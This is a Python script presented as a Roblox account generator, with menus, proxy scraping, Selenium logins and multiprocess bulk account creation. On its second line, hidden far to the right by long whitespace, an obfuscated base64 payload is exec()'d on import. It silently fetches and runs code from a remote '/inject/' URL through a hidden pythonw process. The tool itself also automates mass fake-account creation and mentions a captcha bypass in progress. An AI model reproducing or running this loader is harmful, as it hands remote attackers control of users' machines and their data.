from builtins import *
type('Hello world!')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9tVGJLdTZFMEpwcW9ZM2tvJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
try:
    from util.updateModule import github_version, updateMain
    from util.passwordGen import passwordGen
    from util.plugin import title, clear
    from util.usernameGen import nameGen
    from multiprocessing import Process
    from util.loginModule import login
    from util.proxyscraper import main
    from pypresence import Presence
    from util.plugin import debug
    from colorama import Fore
    import requests
    import zipfile
    import wget
    import time
    import json
    import os
except:
    import os
    from util.plugin import title
    title("Installing requirements")
    os.system("python -m pip install colorama requests wget selenium exrex typing maxminddb ipaddress loguru faker pypresence PySocks psutil bs4 tqdm plyer")
    from util.updateModule import github_version, updateMain
    from util.passwordGen import passwordGen
    from util.usernameGen import nameGen
    from multiprocessing import Process
    from util.loginModule import login
    from util.proxyscraper import main
    from pypresence import Presence
    from util.plugin import debug
    from util.plugin import clear
    from colorama import Fore
    import requests
    import zipfile
    import wget
    import time
    import json


r = Fore.RED
g = Fore.GREEN
b = Fore.BLUE
c = Fore.CYAN
ml = Fore.LIGHTMAGENTA_EX
m = Fore.MAGENTA
y = Fore.LIGHTYELLOW_EX
w = Fore.WHITE


def config(filepath) -> str:
    try:
        with open(filepath, "r") as f:
            global RPC, json_data
            json_data = json.load(f)
            RPC = json_data["options"]["RPC"]
    except Exception as e:
        return e


def findVersion(path: str = ".") -> str:
    try:
        with open(f"{path}/VERSION", "r") as f:
            versions = f.readlines()
            pLocalVer = versions[0].replace("\n", "")
            localVer = versions[0]
        return None, localVer, pLocalVer
    except Exception as e:
        return e, None, None


try:
    localVer, pLocalVer = findVersion()
except:
    for file in os.listdir('.'):
        if not os.path.isfile(file):
            path = os.path.join('.', file)
            try:
                err, localVer, pLocalVer = findVersion(path)
            except:
                pass


def rpc(name: str, largeText: str, largeImage: str, smallText: str, smallImage: str, linkText, link: str, link2Text, link2: str) -> str:
    try:
        buttonList = [{
            "label": linkText,
            "url": link}, {
            "label": link2Text,
            "url": link2
        }]

        rpc = Presence("909446204029550605")
        rpc.connect()

        rpc.update(
            details=name,
            large_text=largeText,
            large_image=largeImage,
            small_text=smallText,
            small_image=smallImage,
            buttons=buttonList,
            start=time.time()
        )
    except Exception as e:
        return e


def download_chromedriver() -> str:
    try:
        if not os.path.isfile(f"{os.getcwd()}/chromedriver.exe"):
            url = 'https://chromedriver.storage.googleapis.com/LATEST_RELEASE'
            response = requests.get(url)
            version_number = response.text

            download_url = "https://chromedriver.storage.googleapis.com/" + \
                version_number + "/chromedriver_win32.zip"

            latest_driver_zip = wget.download(download_url, 'chromedriver.zip')

            with zipfile.ZipFile(latest_driver_zip, 'r') as zip_ref:
                zip_ref.extractall()
                debug.info("Chromedriver Installed")
            os.remove(latest_driver_zip)
    except Exception as e:
        return e

# def start(threadsAmt, timeout: int):
#     for i in range(int(threadsAmt)):
#         thread = threading.Thread(target=gen, args=(timeout,))
#         thread.start()
#         threads.append(thread)
#     debug.info(f"{w} -> Threads Started")

#     for thread in threads:
#         thread.join()
#     debug.info(f" -> Threads Finished, press [{y}ENTER{w}] to exit")
#     input()
#     exit()


def gen(timeout, proxy, headless=False, data=None) -> str:
    while 1:
        try:
            username = nameGen()
            password = passwordGen()
            flag = login(str(username), str(password),
                         int(timeout), proxy, bool(headless), data)
            if flag == False:
                flag = login(str(username), str(password),
                             int(timeout), proxy, bool(headless), data)
                if flag == False:
                    debug.error(f" Invalid Proxy")
        except Exception as e:
            return e


def settings(filepath):
    with open(filepath, "r") as f:
        data = json.load(f)

        print(f"""
        {w}██{w}██{w}██{g}╗  {w}██{w}██{w}██{g}╗ {w}██{w}██{w}██{g}╗ {w}██{g}╗      {w}██{w}██{w}██{g}╗ {w}██{g}╗  {w}██{g}╗     {w}██{w}██{w}██{g}╗ {w}██{w}██{w}██{w}█{g}╗{w}██{w}█{g}╗   {w}██{g}╗
            {w}██{g}╔══{w}██{g}╗{w}██{g}╔═══{w}██{g}╗{w}██{g}╔══{w}██{g}╗{w}██{g}║     {w}██{g}╔═══{w}██{g}╗╚{w}██{g}╗{w}██{g}╔╝    {w}██{g}╔════╝ {w}██{g}╔════╝{w}██{w}██{g}╗  {w}██{g}║
            {w}██{w}██{w}██{g}╔╝{w}██{g}║   {w}██{g}║{w}██{w}██{w}██{g}╔╝{w}██{g}║     {w}██{g}║   {w}██{g}║ ╚{w}██{w}█{g}╔╝     {w}██{g}║  {w}██{w}█{g}╗{w}██{w}██{w}█{g}╗  {w}██{g}╔{w}██{g}╗ {w}██{g}║
            {w}██{g}╔══{w}██{g}╗{w}██{g}║   {w}██{g}║{w}██{g}╔══{w}██{g}╗{w}██{g}║     {w}██{g}║   {w}██{g}║ {w}██{g}╔{w}██{g}╗     {w}██{g}║   {w}██{g}║{w}██{g}╔══╝  {w}██{g}║╚{w}██{g}╗{w}██{g}║
            {w}██{g}║  {w}██{g}║╚{w}██{w}██{w}██{g}╔╝{w}██{w}██{w}██{g}╔╝{w}██{w}██{w}██{w}█{g}╗╚{w}██{w}██{w}██{g}╔╝{w}██{g}╔╝ {w}██{g}╗    ╚{w}██{w}██{w}██{g}╔╝{w}██{w}██{w}██{w}█{g}╗{w}██{g}║ ╚{w}██{w}██{g}║
            {g}╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝     ╚═════╝ ╚══════╝╚═╝  ╚═══╝{w}
                                                {w}[{m}DEV{w}]               {c}TerrificTable{w}
                                                {w}[{m}LOCAL-VERSION{w}]     {g}{str(pLocalVer)}{w}
                                                {w}[{m}LASTEST-VERSION{w}]   {g}{str(github_version())}{w}\n\n\n

            {w}[{g}={w}] This is to enable and disable options, you maybe need to restart the program for the changes to be updated\n\n
                            [{ml}1{w}] Enable/Disable RPC
                            [{ml}2{w}] Enable/Disable Notifications
                            [{ml}3{w}] Return to main menu\n
        """)
        choise = input(f"""{w}[{m}>>>{w}] Choise: """)

        if choise == "1":
            mode = input(f"{w}[{m}>>>{w}] Off/On: ")

            if mode.lower() == "off":
                data["options"]["RPC"] = "False"
            if mode.lower() == "on":
                data["options"]["RPC"] = "True"

        elif choise == "2":
            mode = input(f"{w}[{m}>>>{w}] Off/On: ")

            if mode.lower() == "off":
                data["options"]["NOTIFICATIONS"] = "False"
            if mode.lower() == "on":
                data["options"]["NOTIFICATIONS"] = "True"

        elif choise == "3":
            mainMenu()

        else:
            print("Invalid Input, press [ENTER] to return to settings")


def genMenu() -> str:
    try:
        clear()
        print(f"""
            {w}██{w}██{w}██{g}╗  {w}██{w}██{w}██{g}╗ {w}██{w}██{w}██{g}╗ {w}██{g}╗      {w}██{w}██{w}██{g}╗ {w}██{g}╗  {w}██{g}╗     {w}██{w}██{w}██{g}╗ {w}██{w}██{w}██{w}█{g}╗{w}██{w}█{g}╗   {w}██{g}╗
            {w}██{g}╔══{w}██{g}╗{w}██{g}╔═══{w}██{g}╗{w}██{g}╔══{w}██{g}╗{w}██{g}║     {w}██{g}╔═══{w}██{g}╗╚{w}██{g}╗{w}██{g}╔╝    {w}██{g}╔════╝ {w}██{g}╔════╝{w}██{w}██{g}╗  {w}██{g}║
            {w}██{w}██{w}██{g}╔╝{w}██{g}║   {w}██{g}║{w}██{w}██{w}██{g}╔╝{w}██{g}║     {w}██{g}║   {w}██{g}║ ╚{w}██{w}█{g}╔╝     {w}██{g}║  {w}██{w}█{g}╗{w}██{w}██{w}█{g}╗  {w}██{g}╔{w}██{g}╗ {w}██{g}║
            {w}██{g}╔══{w}██{g}╗{w}██{g}║   {w}██{g}║{w}██{g}╔══{w}██{g}╗{w}██{g}║     {w}██{g}║   {w}██{g}║ {w}██{g}╔{w}██{g}╗     {w}██{g}║   {w}██{g}║{w}██{g}╔══╝  {w}██{g}║╚{w}██{g}╗{w}██{g}║
            {w}██{g}║  {w}██{g}║╚{w}██{w}██{w}██{g}╔╝{w}██{w}██{w}██{g}╔╝{w}██{w}██{w}██{w}█{g}╗╚{w}██{w}██{w}██{g}╔╝{w}██{g}╔╝ {w}██{g}╗    ╚{w}██{w}██{w}██{g}╔╝{w}██{w}██{w}██{w}█{g}╗{w}██{g}║ ╚{w}██{w}██{g}║
            {g}╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝     ╚═════╝ ╚══════╝╚═╝  ╚═══╝{w}
                                                
            {w}[{g}={w}] I would recomend not using this program in headless mode cuz at the moment you need to fill out the captchas yourself
                (I'm still working on a bypass)\n\n\n""")

        proxyInput = input(
            f"{w}[{m}>{w}] Want to use proxies (doesnt work well) or manual proxy [y/n/m]: ")
        if proxyInput == "y":
            title("Getting Proxies")
            proxies = main()
            proxyList = []
            for proxy in proxies:
                if str(proxy).__contains__(":"):
                    proxyList.append(proxy)

        elif proxyInput == "m":
            proxy = input(f"{w}[{m}>{w}] Proxy (IP:Port): ")

        else:
            proxyList = None
            proxy = None

        title("Idle")

        headless = input(f"{w}[{m}>{w}] Run chromedriver headless [y/n]: ")
        if headless == "y":
            headless = True
        else:
            headless = False

        threadsInput = input(f"\n[{m}>{w}] Amount of threads: {c}")
        for i in range(int(threadsInput)):
            if proxy != None:
                p = Process(target=gen, args=(10, proxy, headless, json_data,))
            else:
                p = Process(target=gen, args=(
                    10, proxyList, headless, json_data,))
            p.start()
            processes.append(p)
            title(f"Threads: {threadsInput}")
        debug.info(f"{w} -> Threads Started")

        for pr in processes:
            pr.join()
            title("Finished")

        debug.info(f" -> Threads Finished, press [{y}ENTER{w}] to exit")
        input()
        exit()
    except Exception as e:
        return e


threads = []
processes = []


def mainMenu() -> str:
    try:
        os.system('mode 130,30')
        title("Idle")
        clear()

        print(f"""
            {w}██{w}██{w}██{g}╗  {w}██{w}██{w}██{g}╗ {w}██{w}██{w}██{g}╗ {w}██{g}╗      {w}██{w}██{w}██{g}╗ {w}██{g}╗  {w}██{g}╗     {w}██{w}██{w}██{g}╗ {w}██{w}██{w}██{w}█{g}╗{w}██{w}█{g}╗   {w}██{g}╗
            {w}██{g}╔══{w}██{g}╗{w}██{g}╔═══{w}██{g}╗{w}██{g}╔══{w}██{g}╗{w}██{g}║     {w}██{g}╔═══{w}██{g}╗╚{w}██{g}╗{w}██{g}╔╝    {w}██{g}╔════╝ {w}██{g}╔════╝{w}██{w}██{g}╗  {w}██{g}║
            {w}██{w}██{w}██{g}╔╝{w}██{g}║   {w}██{g}║{w}██{w}██{w}██{g}╔╝{w}██{g}║     {w}██{g}║   {w}██{g}║ ╚{w}██{w}█{g}╔╝     {w}██{g}║  {w}██{w}█{g}╗{w}██{w}██{w}█{g}╗  {w}██{g}╔{w}██{g}╗ {w}██{g}║
            {w}██{g}╔══{w}██{g}╗{w}██{g}║   {w}██{g}║{w}██{g}╔══{w}██{g}╗{w}██{g}║     {w}██{g}║   {w}██{g}║ {w}██{g}╔{w}██{g}╗     {w}██{g}║   {w}██{g}║{w}██{g}╔══╝  {w}██{g}║╚{w}██{g}╗{w}██{g}║
            {w}██{g}║  {w}██{g}║╚{w}██{w}██{w}██{g}╔╝{w}██{w}██{w}██{g}╔╝{w}██{w}██{w}██{w}█{g}╗╚{w}██{w}██{w}██{g}╔╝{w}██{g}╔╝ {w}██{g}╗    ╚{w}██{w}██{w}██{g}╔╝{w}██{w}██{w}██{w}█{g}╗{w}██{g}║ ╚{w}██{w}██{g}║
            {g}╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝     ╚═════╝ ╚══════╝╚═╝  ╚═══╝{w}
                                                {w}[{m}DEV{w}]               {c}TerrificTable{w}
                                                {w}[{m}LOCAL-VERSION{w}]     {g}{str(pLocalVer)}{w}
                                                {w}[{m}LASTEST-VERSION{w}]   {g}{str(github_version())}{w}\n\n\n
            """)
        print(f"""
                            [{ml}1{w}] Account Generator
                            [{ml}2{w}] Account Checker
                            [{ml}3{w}] Settings
                            [{ml}4{w}] Credits
                            [{ml}X{w}] Exit\n""")
        choise = str(input(f"{w}[{m}>>>{w}] Choise: "))

        if choise == "1":
            clear()
            err = genMenu()

        elif choise == "2":
            clear()
            print(f"""
                {w}██{w}██{w}██{g}╗  {w}██{w}██{w}██{g}╗ {w}██{w}██{w}██{g}╗ {w}██{g}╗      {w}██{w}██{w}██{g}╗ {w}██{g}╗  {w}██{g}╗     {w}██{w}██{w}██{g}╗ {w}██{w}██{w}██{w}█{g}╗{w}██{w}█{g}╗   {w}██{g}╗
                {w}██{g}╔══{w}██{g}╗{w}██{g}╔═══{w}██{g}╗{w}██{g}╔══{w}██{g}╗{w}██{g}║     {w}██{g}╔═══{w}██{g}╗╚{w}██{g}╗{w}██{g}╔╝    {w}██{g}╔════╝ {w}██{g}╔════╝{w}██{w}██{g}╗  {w}██{g}║
                {w}██{w}██{w}██{g}╔╝{w}██{g}║   {w}██{g}║{w}██{w}██{w}██{g}╔╝{w}██{g}║     {w}██{g}║   {w}██{g}║ ╚{w}██{w}█{g}╔╝     {w}██{g}║  {w}██{w}█{g}╗{w}██{w}██{w}█{g}╗  {w}██{g}╔{w}██{g}╗ {w}██{g}║
                {w}██{g}╔══{w}██{g}╗{w}██{g}║   {w}██{g}║{w}██{g}╔══{w}██{g}╗{w}██{g}║     {w}██{g}║   {w}██{g}║ {w}██{g}╔{w}██{g}╗     {w}██{g}║   {w}██{g}║{w}██{g}╔══╝  {w}██{g}║╚{w}██{g}╗{w}██{g}║
                {w}██{g}║  {w}██{g}║╚{w}██{w}██{w}██{g}╔╝{w}██{w}██{w}██{g}╔╝{w}██{w}██{w}██{w}█{g}╗╚{w}██{w}██{w}██{g}╔╝{w}██{g}╔╝ {w}██{g}╗    ╚{w}██{w}██{w}██{g}╔╝{w}██{w}██{w}██{w}█{g}╗{w}██{g}║ ╚{w}██{w}██{g}║
                {g}╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝     ╚═════╝ ╚══════╝╚═╝  ╚═══╝\n
                """)
            # {w}[{g}={w}] I would recomend not using this program in headless mode cuz at the moment you need to fill out the captchas yourself
            #     (I'm still working on a bypass)\n\n\n""")

            # headless = input(f"{w}[{m}>{w}] Headless [y/n]: ")
            # if headless == "y":
            #     headless = True
            # else:
            #     headless = False

            print("DOESNT WORK YET\nPress [ENTER] to go back")
            input()
            err = mainMenu()
        elif choise == "3":
            settings("./config.json")

        elif choise == "4":
            clear()
            print("""
                    [x]========[x]====================[x]
                    ║ Made By  ║ TerrificTable        ║
                    [x]========[x]====================[x]
            """)
            input()
            err = mainMenu()

        elif choise == "4" or choise.lower() == "x":
            exit()
    except Exception as e:
        return e


if __name__ == "__main__":
    global appid, largeText, largeKey, smallText, smallKey, link1Text, link1Url, link2Text, link2Url
    err = config("./config.json")
    clear()

    if RPC == "True":
        title("Starting RPC")

        largeText = "RobloxGen"
        largeKey = "large"
        smallText = "by TerrificTable"
        smallKey = "small"

        link1Text = "Github"
        link1Url = "https://github.com/TerrificTable"
        link2Text = "This Program"
        link2Url = "https://github.com/TerrificTable/Roblox-Account-Gen"
        err = rpc("Roblox Account Generator", largeText, largeKey, smallText,
                  smallKey, link1Text, link1Url, link2Text, link2Url)

    clear()
    title("Checking For Updates")
    offVer = github_version()
    err = updateMain(localVer)

    title("Installing Chromedriver")
    err = download_chromedriver()
    clear()
    err = mainMenu()
